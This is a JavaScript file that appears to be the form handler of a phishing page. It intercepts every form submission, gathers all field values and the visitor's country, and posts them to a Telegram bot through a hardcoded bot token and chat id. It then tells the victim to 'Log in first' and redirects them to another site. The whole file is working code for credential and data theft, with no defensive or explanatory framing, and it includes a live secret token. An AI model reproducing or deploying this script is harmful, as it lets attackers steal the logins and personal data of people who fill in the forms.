document.addEventListener("DOMContentLoaded", () => {
  const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
  const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown"; // default

  // Fetch country name first
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data && data.country_name) {
        userCountry = data.country_name;
      }
    })
    .catch(err => console.error("IP lookup error:", err));

  forms.forEach((form, index) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (userCountry === "Unknown") {
        try {
          const res = await fetch("https://ipapi.co/json/");
          const data = await res.json();
          if (data && data.country_name) {
            userCountry = data.country_name;
          }
        } catch (err) {
          console.error("Retry IP lookup error:", err);
        }
      }

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      const formData = {};
      new FormData(form).forEach((value, key) => {
        formData[key] = value;
      });

      const payload = {
        chat_id: userId,
        text: `📋 *New Form Submitted*\n\n🏷️ Page: ${document.title}\n📄 Form: ${form.getAttribute("name") || `Form-${index + 1}`}\n🌍 Country: ${userCountry}\n\n` +
              Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
        parse_mode: "Markdown"
      };

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          alert(`Log in first`);
          form.reset();
          window.location.href = "https://otieu.com/4/9831084";
        } else {
          const errorText = await response.text();
          console.error("Telegram Error:", errorText);
          alert(`❌ Error submitting form. Check console for details.`);
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error. Please check your connection.");
      }
    });
  });
});